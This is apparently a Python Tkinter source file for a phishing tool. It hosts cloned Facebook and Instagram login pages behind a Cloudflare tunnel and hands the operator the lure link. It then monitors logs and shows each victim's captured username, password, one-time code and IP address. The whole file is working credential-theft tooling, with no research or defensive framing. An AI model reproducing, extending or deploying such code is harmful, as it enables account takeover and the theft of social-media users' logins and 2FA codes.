from tkinter import *
import os
def sites():
	def fishinsta():
		link = os.system("cd assets/sites/instagram; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
		def capture():
			file_size = os.path.getsize('assets/sites/instagram/log.txt')
			while True:
				new_size=os.path.getsize('assets/sites/instagram/log.txt')
				if (new_size > file_size):
					os.system("bash assets/bashscript.sh instagram")
					break
		def uname():
			g= open('process/username.txt', 'r')	 
			unameplace.delete(0, END)
			unameplace.insert(INSERT, g.read())
		def pwget():
			h = open("process/password.txt")
			pwarea.delete(0, END)
			pwarea.insert(INSERT, h.read())
		def copying(event):
			copybutton.config(text="copied link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
			copier = Tk()
			r = open("process/new.txt")
			copier.withdraw()
			copier.clipboard_clear()
			copier.clipboard_append(r.read())
			copier.update()
			copier.destroy()
		def destroy():
			root.destroy()
			root1.destroy()
			root4.destroy()		
		def otpget():
			i = open("process/otp.txt")
			otparea.delete(0, END)
			otparea.insert(INSERT, i.read())
		def ipfinder():
			j = open("process/ip.txt")
			ipplace.delete(0, END)
			ipplace.insert(INSERT, j.read())	
		root4 = Tk()
		root4.title("Instagram link")
		
		copyplace = Entry(root4, width=60, font="Calibri 10")
		copyplace.grid(row=0,column=2)
		copyplace.insert(INSERT, "click copy link to get link")	
		copybutton = Button(root4,text="copy button",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
		copybutton.bind('<Enter>', copying)
		copybutton.grid(row=0, column=0)
		
		listener = Button(root4, text="start capturing",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
	
		ip = Button(root4,text="ip",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= ipfinder)
		ip.grid(row=2, column=0)
		ipplace= Entry(root4, width=60, font="Calibri 10")
		ipplace.grid(row=2, column=2)
		ipplace.insert(INSERT, "click ip to update")
		
		username = Button(root4,text="username",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= uname)
		username.grid(row=3, column=0)
		unameplace= Entry(root4, width=60, font="Calibri 10")
		unameplace.grid(row=3, column=2)
		unameplace.insert(INSERT, "click username to update")
		
		pw = Button(root4,text="password",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= pwget)
		pw.grid(row=4, column=0)
		pwarea = Entry(root4, width=60, font="Calibri 10")
		pwarea.grid(row=4,column=2)
		pwarea.insert(INSERT, "click password to update")
		
		otp = Button(root4,text="OTP",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= otpget)
		otp.grid(row=5, column=0)
		otparea = Entry(root4, width=60, font="Calibri 10")
		otparea.grid(row=5,column=2)
		otparea.insert(INSERT, "click OTP to update")
		closeall=Button(root4, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2),
		root4.mainloop()
	def fishfacebook():		
		link = os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
		def capture():
			file_size = os.path.getsize('assets/sites/facebook/log.txt')
			while True:
				new_size=os.path.getsize('assets/sites/facebook/log.txt')
				if (new_size > file_size):
					os.system("bash assets/bashscript.sh facebook")
					break
		def uname():
			g= open('process/username.txt', 'r')	 
			unameplace.delete(0, END)
			unameplace.insert(INSERT, g.read())
		def pwget():
			h = open("process/password.txt")
			pwarea.delete(0, END)
			pwarea.insert(INSERT, h.read())
		def copying(event):
			copybutton.config(text="copied link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
			copier = Tk()
			r = open("process/new.txt")
			copier.withdraw()
			copier.clipboard_clear()
			copier.clipboard_append(r.read())
			copier.update()
			copier.destroy()
		def destroy():
			root.destroy()
			root1.destroy()
			root3.destroy()		
		def otpget():
			i = open("process/otp.txt")
			otparea.delete(0, END)
			otparea.insert(INSERT, i.read())
		def ipfinder():
			j = open("process/ip.txt")
			ipplace.delete(0, END)
			ipplace.insert(INSERT, j.read())	
		root3 = Tk()
		root3.title("facebook link")
		
		copyplace = Entry(root3, width=60, font="Calibri 10")
		copyplace.grid(row=0,column=2)
		copyplace.insert(INSERT, "click copy link to get link")	
		copybutton = Button(root3,text="copy button",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
		copybutton.bind('<Enter>', copying)
		copybutton.grid(row=0, column=0)
		
		listener = Button(root3, text="start capturing",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
	
		ip = Button(root3,text="ip",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= ipfinder)
		ip.grid(row=2, column=0)
		ipplace= Entry(root3, width=60, font="Calibri 10")
		ipplace.grid(row=2, column=2)
		ipplace.insert(INSERT, "click ip to update")
		
		username = Button(root3,text="username",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= uname)
		username.grid(row=3, column=0)
		unameplace= Entry(root3, width=60, font="Calibri 10")
		unameplace.grid(row=3, column=2)
		unameplace.insert(INSERT, "click username to update")
		
		pw = Button(root3,text="password",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= pwget)
		pw.grid(row=4, column=0)
		pwarea = Entry(root3, width=60, font="Calibri 10")
		pwarea.grid(row=4,column=2)
		pwarea.insert(INSERT, "click password to update")
		
		otp = Button(root3,text="OTP",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= otpget)
		otp.grid(row=5, column=0)
		otparea = Entry(root3, width=60, font="Calibri 10")
		otparea.grid(row=5,column=2)
		otparea.insert(INSERT, "click OTP to update")
		closeall=Button(root3, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2),
		root3.mainloop()
	root1 = Tk()
	root1.geometry('500x100+500+760')
	root1.title("coose option")
	option1 = Button(root1, text = 'Facebook',font=('Times New Roman', 18,'bold'), bg="blue", fg="white", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = fishfacebook).grid(row = 0, column = 0)
	option1 = Button(root1, text = 'instagram',font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="pink", activeforeground="red", cursor="hand2", relief=SUNKEN,command = fishinsta).grid(row = 0, column = 1)
	toolcloser = Button(root1, text = 'Quit !',font=('Times New Roman', 18,'bold'), bg="red", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command = root1.destroy).grid(row = 0, column = 3)
	root1.mainloop()
os.system("""
#!/bin/bash
if [ -f process/new.txt ]; then
rm process/new.txt
fi
	""")
	
os.system("""if [ ! -d process ]; then mkdir -p process; fi""")	
root=Tk()
root.title("practise")
root.geometry("300x100+600+900")
button1=Button(root, text="Start!", font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=sites).grid(row=0, column=3)
button2=Button(root, text="exit", font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=root.destroy).grid(row=0, column=4)
root.mainloop()
